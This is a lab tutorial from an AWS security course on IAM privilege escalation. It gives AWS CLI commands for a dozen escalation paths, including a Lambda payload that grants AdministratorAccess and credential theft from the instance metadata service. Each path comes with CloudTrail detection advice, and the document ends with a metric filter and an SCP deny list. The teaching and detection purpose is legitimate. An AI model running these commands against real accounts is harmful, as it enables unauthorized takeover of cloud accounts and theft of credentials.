# 📈 IAM Privilege Escalation — Attack Paths & Detection

> **Phase 4 · Document 23 of 29**  
> **Estimated cost:** Free · **Estimated time:** 90 minutes  
> **Prerequisites:** `22-cloudgoat-lab-setup.md`, `02-iam-users-groups-roles.md`  
> ⚠️ **Only against your dedicated attack account**

---

## What Is IAM Privilege Escalation?

A low-privilege IAM identity uses permitted actions to gain higher permissions than intended — often reaching full administrator access without ever touching a "privileged" API call directly.

```
dev-alice (ReadOnly)
      │
      │  uses permitted actions creatively
      ▼
dev-alice (AdministratorAccess)
```

> Rhino Security Labs documented 21 distinct IAM privilege escalation paths. Understanding them from both sides — attacker and defender — is core to cloud security.

---

## The Enumeration Phase (Always First)

Before exploiting, enumerate what permissions the identity has:

```bash
# Who am I?
aws sts get-caller-identity

# My attached policies
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)

# My inline policies
aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)

# My groups and their policies
aws iam list-groups-for-user --user-name $(aws iam get-user --query 'User.UserName' --output text)

# Full policy document for each attached policy
POLICY_ARN="arn:aws:iam::ACCOUNT-ID:policy/SomePolicy"
VERSION=$(aws iam get-policy --policy-arn $POLICY_ARN --query 'Policy.DefaultVersionId' --output text)
aws iam get-policy-version --policy-arn $POLICY_ARN --version-id $VERSION
```

### Automated enumeration with enumerate-iam

```bash
# Install
pip3 install enumerate-iam

# Run against your identity
python3 enumerate-iam.py \
  --access-key AKIAIOSFODNN7EXAMPLE \
  --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# This tries every AWS API call and reports which ones succeed
# Gives you a complete picture of actual permissions
```

---

## The 15 Most Common Escalation Paths

### Path 1 — iam:CreatePolicyVersion

**Permission needed:** `iam:CreatePolicyVersion`  
**What it does:** Create a new version of an existing policy with admin access

```bash
# Create a new policy version with admin permissions
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT-ID:policy/MyPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --set-as-default

# Verify admin access
aws iam list-users  # if this works, escalation succeeded
```

**Detection:** CloudTrail `CreatePolicyVersion` followed by elevated API calls

---

### Path 2 — iam:SetDefaultPolicyVersion

**Permission needed:** `iam:SetDefaultPolicyVersion`  
**What it does:** Roll back to a previously existing permissive policy version

```bash
# List all versions of a policy
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::ACCOUNT-ID:policy/MyPolicy

# Check each version for permissive statements
for VERSION in v1 v2 v3 v4 v5; do
  echo "=== $VERSION ==="
  aws iam get-policy-version \
    --policy-arn arn:aws:iam::ACCOUNT-ID:policy/MyPolicy \
    --version-id $VERSION 2>/dev/null
done

# Set the most permissive old version as default
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT-ID:policy/MyPolicy \
  --version-id v3
```

**Detection:** CloudTrail `SetDefaultPolicyVersion`

---

### Path 3 — iam:CreateAccessKey (for another user)

**Permission needed:** `iam:CreateAccessKey` on other users  
**What it does:** Create access keys for an existing admin user

```bash
# List users and find an admin
aws iam list-users
aws iam list-attached-user-policies --user-name admin-user

# Create access keys for the admin user
aws iam create-access-key --user-name admin-user

# Use those keys to get admin access
aws configure --profile stolen-admin
# Enter the new keys
aws iam list-users --profile stolen-admin  # admin level access
```

**Detection:** CloudTrail `CreateAccessKey` where `requestParameters.userName` differs from `userIdentity.userName`

---

### Path 4 — iam:CreateLoginProfile

**Permission needed:** `iam:CreateLoginProfile`  
**What it does:** Add console password to an admin user who has none

```bash
# Find admin users without console access
aws iam list-users --query 'Users[*].UserName' --output text | \
  xargs -I {} sh -c 'aws iam get-login-profile --user-name {} 2>/dev/null && echo {}'

# Create console login for an admin user
aws iam create-login-profile \
  --user-name admin-user \
  --password "Escalat3dP@ssword!" \
  --no-password-reset-required

# Now log into console as admin-user
```

**Detection:** CloudTrail `CreateLoginProfile` where the target user has admin policies

---

### Path 5 — iam:UpdateLoginProfile

**Permission needed:** `iam:UpdateLoginProfile`  
**What it does:** Change the password of an existing admin user

```bash
aws iam update-login-profile \
  --user-name admin-user \
  --password "NewP@ssword123!"

# Log into console as admin-user with new password
```

**Detection:** CloudTrail `UpdateLoginProfile` on a high-privilege user

---

### Path 6 — iam:AttachUserPolicy

**Permission needed:** `iam:AttachUserPolicy`  
**What it does:** Attach AdministratorAccess directly to your own user

```bash
# Attach admin policy to yourself
aws iam attach-user-policy \
  --user-name dev-alice \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Verify
aws iam list-users  # should now work with full access
```

**Detection:** CloudTrail `AttachUserPolicy` where the user attaches to themselves — especially with `AdministratorAccess`

---

### Path 7 — iam:AttachGroupPolicy + iam:AddUserToGroup

**Permission needed:** Both actions  
**What it does:** Add yourself to an admin group

```bash
# List groups with admin policies
aws iam list-groups
aws iam list-attached-group-policies --group-name admins

# Add yourself to the admin group
aws iam add-user-to-group \
  --user-name dev-alice \
  --group-name admins
```

**Detection:** CloudTrail `AddUserToGroup` where the group has admin policies

---

### Path 8 — iam:PassRole + ec2:RunInstances

**Permission needed:** `iam:PassRole` and `ec2:RunInstances`  
**What it does:** Launch an EC2 instance with an admin IAM role attached, then use the instance metadata service to steal those admin credentials

```bash
# Find a role with admin permissions
aws iam list-roles | jq '.Roles[].RoleName'

# Check which roles have admin access
aws iam list-attached-role-policies --role-name AdminRole

# Launch EC2 with the admin role attached
aws ec2 run-instances \
  --image-id ami-xxxxxxxxxx \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminRole \
  --subnet-id subnet-xxxxxxxxx \
  --security-group-ids sg-xxxxxxxxx

# SSH into the new instance and steal credentials
ssh ec2-user@<new-instance-ip>
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
```

**Detection:** CloudTrail `RunInstances` with `iamInstanceProfile` specified by a non-admin user

---

### Path 9 — iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction

**Permission needed:** All three  
**What it does:** Create a Lambda with an admin role, invoke it to perform admin actions

```bash
# Create malicious Lambda function
cat > privesc.py << 'EOF'
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    # Attach admin policy to attacker's user
    iam.attach_user_policy(
        UserName='dev-alice',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "Privilege escalation complete"
EOF

zip privesc.zip privesc.py

# Create the function with an admin role
aws lambda create-function \
  --function-name privesc-lambda \
  --runtime python3.12 \
  --handler privesc.lambda_handler \
  --role arn:aws:iam::ACCOUNT-ID:role/AdminRole \
  --zip-file fileb://privesc.zip

# Invoke it — Lambda runs as AdminRole
aws lambda invoke \
  --function-name privesc-lambda \
  output.txt

cat output.txt  # "Privilege escalation complete"

# Now dev-alice has admin access
aws iam list-users  # works
```

**Detection:** CloudTrail `CreateFunction` with admin role + `Invoke` by low-privilege user in quick succession

---

### Path 10 — iam:PassRole + glue:CreateDevEndpoint

**Permission needed:** `iam:PassRole` and `glue:CreateDevEndpoint`  
**What it does:** Create a Glue development endpoint with admin role, SSH in and use credentials

```bash
# Create Glue dev endpoint with admin role
aws glue create-dev-endpoint \
  --endpoint-name privesc-endpoint \
  --role-arn arn:aws:iam::ACCOUNT-ID:role/AdminRole \
  --public-key "$(cat ~/.ssh/id_rsa.pub)"

# Wait for endpoint to be READY (5-10 minutes)
aws glue get-dev-endpoint --endpoint-name privesc-endpoint

# SSH into the endpoint
ssh -i ~/.ssh/id_rsa glue@<endpoint-public-address>

# Inside the endpoint — steal the attached role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
```

**Detection:** CloudTrail `CreateDevEndpoint` by non-data-engineering users

---

### Path 11 — sts:AssumeRole

**Permission needed:** `sts:AssumeRole` on a high-privilege role  
**What it does:** Directly assume an admin role

```bash
# List assumable roles
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS!=null]].{Name:RoleName,ARN:Arn}'

# Check if you can assume an admin role
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT-ID:role/AdminRole \
  --role-session-name escalation-session

# Use returned credentials
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws iam list-users  # running as AdminRole
```

**Detection:** CloudTrail `AssumeRole` where the principal is not normally expected to assume that role

---

### Path 12 — iam:UpdateAssumeRolePolicy

**Permission needed:** `iam:UpdateAssumeRolePolicy`  
**What it does:** Modify the trust policy of an admin role to allow your identity to assume it

```bash
# Update the trust policy to allow your user to assume it
aws iam update-assume-role-policy \
  --role-name AdminRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::ACCOUNT-ID:user/dev-alice"
      },
      "Action": "sts:AssumeRole"
    }]
  }'

# Now assume the role
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT-ID:role/AdminRole \
  --role-session-name my-session
```

**Detection:** CloudTrail `UpdateAssumeRolePolicy` on high-privilege roles

---

## Detection Rules for All Escalation Paths

### CloudWatch metric filter — catch all escalation attempts

```
{ ($.eventName = "CreatePolicyVersion") ||
  ($.eventName = "SetDefaultPolicyVersion") ||
  ($.eventName = "AttachUserPolicy") ||
  ($.eventName = "AttachGroupPolicy") ||
  ($.eventName = "AttachRolePolicy") ||
  ($.eventName = "PutUserPolicy") ||
  ($.eventName = "PutGroupPolicy") ||
  ($.eventName = "PutRolePolicy") ||
  ($.eventName = "AddUserToGroup") ||
  ($.eventName = "CreateLoginProfile") ||
  ($.eventName = "UpdateLoginProfile") ||
  ($.eventName = "CreateAccessKey") ||
  ($.eventName = "UpdateAssumeRolePolicy") }
```

Alert threshold: ANY occurrence → immediate alert.

### CloudTrail Insights

Enable Insights on your trail to automatically detect anomalous API call rates:

```
CloudTrail → Trails → lab-audit-trail → Insights → Enable
  Insight type: API call rate
  Insight type: API error rate
```

An attacker enumerating permissions generates a burst of API calls — Insights detects this automatically.

---

## IAM Privilege Escalation Prevention

### Service Control Policies (SCPs) — block escalation org-wide

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyIAMEscalationPaths",
      "Effect": "Deny",
      "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion",
        "iam:AttachUserPolicy",
        "iam:AttachGroupPolicy",
        "iam:AttachRolePolicy",
        "iam:PutUserPolicy",
        "iam:UpdateAssumeRolePolicy",
        "iam:CreateAccessKey",
        "iam:CreateLoginProfile",
        "iam:UpdateLoginProfile",
        "iam:AddUserToGroup"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalArn": [
            "arn:aws:iam::ACCOUNT-ID:role/SecurityAdminRole"
          ]
        }
      }
    }
  ]
}
```

> This SCP denies ALL IAM modification actions to everyone except the designated SecurityAdminRole. Even if an attacker has full account access via a compromised key, they cannot escalate IAM permissions.

---

## Privilege Escalation Mindmap

```
Starting permissions
      │
      ├── Can I modify policies?
      │     ├── CreatePolicyVersion → new admin version
      │     └── SetDefaultPolicyVersion → rollback to permissive version
      │
      ├── Can I modify users?
      │     ├── CreateAccessKey → steal another user's access
      │     ├── CreateLoginProfile → console access to admin user
      │     ├── UpdateLoginProfile → change admin password
      │     ├── AttachUserPolicy → give myself admin
      │     └── AddUserToGroup → join admin group
      │
      ├── Can I PassRole?
      │     ├── + RunInstances → EC2 with admin role → IMDS theft
      │     ├── + CreateFunction + Invoke → Lambda runs as admin role
      │     ├── + CreateDevEndpoint → Glue endpoint with admin role
      │     └── + UpdateFunctionCode → modify existing Lambda
      │
      └── Can I assume roles?
            ├── AssumeRole → directly assume admin role
            └── UpdateAssumeRolePolicy → add myself to trust policy
```

---

## Phase 4 Progress Tracker

- [x] CloudGoat lab setup
- [x] IAM privilege escalation paths
- [ ] IMDS attack and hardening
- [ ] S3 misconfiguration attacks
- [ ] Pacu framework basics

---

*Phase 4 · AWS Cybersecurity & Digital Forensics Roadmap*
